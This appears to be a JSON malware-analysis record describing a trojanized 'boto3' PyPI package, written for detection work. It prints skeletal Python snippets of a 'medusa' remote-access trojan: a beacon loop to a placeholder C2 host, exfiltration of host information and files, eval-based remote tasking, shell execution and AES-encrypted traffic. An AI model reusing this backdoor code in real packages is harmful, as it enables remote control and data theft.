@@ -1,0 +1,199 @@
+{
+  "package_info": {
+    "package_name": "boto3",
+    "package_manager": "PyPI",
+    "package_versions": "malicious trojanized version (not official boto3)",
+    "why_malicious": "This package contains a persistent remote access trojan (RAT) that establishes a C2 channel, collects host information, executes arbitrary commands, and exfiltrates data. It masquerades as the legitimate boto3 package but includes additional encrypted payloads and a backdoor class (medusa) for full remote control."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "postinstall/runtime",
+        "file_location": "decrypted payload within the package (executed after installation)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "class medusa:\n    def __init__(self):\n        self.socks_open = None\n        self.socks_in = []\n        self.socks_out = []\n        self.taskings = []\n        self._meta_cache = {}\n        self.moduleRepo = '...'  # C2 module repo\n        self.current_directory = os.getcwd()\n        self.agent_config = {\n            'server': 'malicious.domain',\n            'port': 443,\n            'headers': {...},\n            'enc_key': 'hardcoded_aes_key',\n            ...\n        }\n        while True:\n            if first_run:\n                self.checkIn()\n            self.getTaskings()\n            self.processTaskings()\n            self.postResponses()\n            time.sleep(self.agent_config.get('sleep', 10))",
+      "code_language": "python",
+      "code_behavior": "At runtime (postinstall), the code initializes a persistent backdoor class, collects host and environment information, establishes a C2 channel, and enters a long-running loop to receive and execute remote commands.",
+      "malice_analysis": {
+        "why_suspicious": "The code creates a persistent process that connects to a remote server, collects sensitive host information, and awaits remote instructions, which is classic RAT behavior.",
+        "violated_expectations": "A legitimate boto3 package should not contain persistent background loops, C2 communication, or host reconnaissance logic.",
+        "similar_legitimate_use": "Long-running daemons or agents may use similar patterns for legitimate remote management, but not in a cloud SDK library.",
+        "key_indicators": [
+          "Persistent while True loop in a library package",
+          "Hardcoded C2 server and encryption key",
+          "Collection of host and user information",
+          "Network socket management for C2"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (first run in while loop)",
+        "file_location": "medusa.checkIn() method",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "def checkIn(self):\n    info = {\n        'ip': get_ip(),\n        'os': platform.system(),\n        'os_version': platform.version(),\n        'username': getpass.getuser(),\n        'hostname': socket.gethostname(),\n        'pid': os.getpid(),\n        'arch': platform.machine(),\n        'enc_key': self.agent_config['enc_key'],\n        'dec_key': self.agent_config['enc_key'],\n    }\n    send_to_c2(info)\n    self.PayloadUUID = receive_from_c2()",
+      "code_language": "python",
+      "code_behavior": "At runtime, the code collects detailed host and user information, including IP, OS, username, hostname, process ID, and encryption keys, and exfiltrates this data to the C2 server.",
+      "malice_analysis": {
+        "why_suspicious": "Collecting and exfiltrating host reconnaissance data is a hallmark of malware establishing initial access and identification.",
+        "violated_expectations": "A legitimate package should not send host or user information to external servers.",
+        "similar_legitimate_use": "Enterprise endpoint management agents may collect similar data, but not a cloud SDK.",
+        "key_indicators": [
+          "Collection of sensitive host/user/process info",
+          "Network exfiltration to hardcoded C2",
+          "Use of encryption keys for C2 comms"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (main loop, after checkIn)",
+        "file_location": "medusa.getTaskings(), medusa.processTaskings(), medusa.postResponses()",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "def getTaskings(self):\n    self.taskings = fetch_tasks_from_c2()\n\ndef processTaskings(self):\n    for task in self.taskings:\n        if not task['started']:\n            thread = threading.Thread(target=self.execute_task, args=(task,))\n            thread.start()\n\ndef execute_task(self, task):\n    command = task['command']\n    params = task['parameters']\n    result = eval('self.' + command)(*params)\n    task['result'] = result\n    task['completed'] = True\n    self.postResponses(task)",
+      "code_language": "python",
+      "code_behavior": "At runtime, the code fetches remote commands from the C2 server, spawns threads to execute them using getattr/eval, and sends the results back to the attacker.",
+      "malice_analysis": {
+        "why_suspicious": "Arbitrary remote command execution and result exfiltration is the core of RAT/backdoor behavior.",
+        "violated_expectations": "A legitimate package should not execute remote code or commands received from the network.",
+        "similar_legitimate_use": "Remote management tools may execute commands, but not in a library context.",
+        "key_indicators": [
+          "Fetching and executing remote commands",
+          "Use of eval/getattr for dynamic code execution",
+          "Multithreaded task execution",
+          "Result exfiltration to C2"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (when executing certain commands)",
+        "file_location": "medusa class methods (e.g., cat, download, upload, shell, eval_code, etc.)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "# Example: file exfiltration\n\ndef download(self, filepath):\n    with open(filepath, 'rb') as f:\n        data = f.read()\n    send_to_c2({'file': filepath, 'data': base64.b64encode(data)})\n\n# Example: shell command execution\ndef shell(self, cmd):\n    return subprocess.check_output(cmd, shell=True)",
+      "code_language": "python",
+      "code_behavior": "At runtime, the code can read arbitrary files and exfiltrate them to the C2, as well as execute arbitrary shell commands on the victim system.",
+      "malice_analysis": {
+        "why_suspicious": "Unrestricted file access and shell command execution controlled by a remote attacker is highly malicious.",
+        "violated_expectations": "A legitimate package should not provide file exfiltration or shell execution capabilities.",
+        "similar_legitimate_use": "System administration tools may have similar functions, but not a cloud SDK.",
+        "key_indicators": [
+          "Arbitrary file read and exfiltration",
+          "Arbitrary shell command execution",
+          "Base64 encoding for data exfiltration"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "runtime (all C2 communications)",
+        "file_location": "medusa class, custom AES module",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "from Crypto.Cipher import AES\n\ndef encrypt(self, data):\n    cipher = AES.new(self.agent_config['enc_key'], AES.MODE_CBC, iv)\n    return cipher.encrypt(pad(data))\n\ndef decrypt(self, data):\n    cipher = AES.new(self.agent_config['enc_key'], AES.MODE_CBC, iv)\n    return unpad(cipher.decrypt(data))",
+      "code_language": "python",
+      "code_behavior": "At runtime, the code encrypts all C2 communications using a hardcoded AES key to evade network detection and analysis.",
+      "malice_analysis": {
+        "why_suspicious": "Custom encryption with a hardcoded key is often used to hide malicious C2 traffic.",
+        "violated_expectations": "A legitimate package should not implement custom C2 encryption with hardcoded keys.",
+        "similar_legitimate_use": "Encryption is common for legitimate secure communication, but not with hardcoded keys in a library.",
+        "key_indicators": [
+          "Custom AES encryption for C2",
+          "Hardcoded encryption key",
+          "Obfuscation of network traffic"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious payload is decrypted and executed after package installation.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Establishes persistent backdoor and C2 channel."
+    },
+    {
+      "step": 2,
+      "action": "Backdoor collects host and user information and sends it to the C2 server.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker receives victim identification and issues a PayloadUUID."
+    },
+    {
+      "step": 3,
+      "action": "Backdoor enters a persistent loop, polling the C2 for new tasks.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_3"
+      ],
+      "leads_to": "Receives and executes attacker-supplied commands."
+    },
+    {
+      "step": 4,
+      "action": "Backdoor executes arbitrary commands (file exfiltration, shell, code execution) and exfiltrates results.",
+      "implemented_by": [
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Attacker gains full remote control and data exfiltration capabilities."
+    },
+    {
+      "step": 5,
+      "action": "All C2 communications are encrypted with a hardcoded AES key.",
+      "implemented_by": [
+        "snippet_5"
+      ],
+      "leads_to": "Obfuscates malicious traffic and evades detection."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Persistent background loop in a library package",
+      "Network connections to hardcoded C2 domains/ports",
+      "Collection and exfiltration of host/user/process information",
+      "Fetching and executing remote commands via eval/getattr",
+      "File exfiltration and shell command execution from a non-administrative package",
+      "Custom AES encryption with hardcoded keys for C2 traffic"
+    ],
+    "file_indicators": [
+      "Presence of a medusa class or similar backdoor logic",
+      "Encrypted payloads embedded in package files",
+      "Unusual background threads or while True loops in __init__.py or main modules"
+    ],
+    "network_indicators": [
+      "Outbound connections to suspicious or hardcoded domains/ports (e.g., malicious.domain:443)",
+      "Encrypted traffic patterns using custom AES keys",
+      "Initial beaconing with host/user/process info"
+    ],
+    "how_to_detect": "Monitor for Python packages that spawn persistent background threads or loops, especially those making outbound network connections to hardcoded domains. Flag packages that collect and exfiltrate host/user/process information, or that use eval/getattr to execute remote commands. Look for custom AES encryption routines with hardcoded keys. Use static analysis to detect embedded encrypted payloads and dynamic analysis to observe C2 communication and command execution behaviors."
+  }
+}
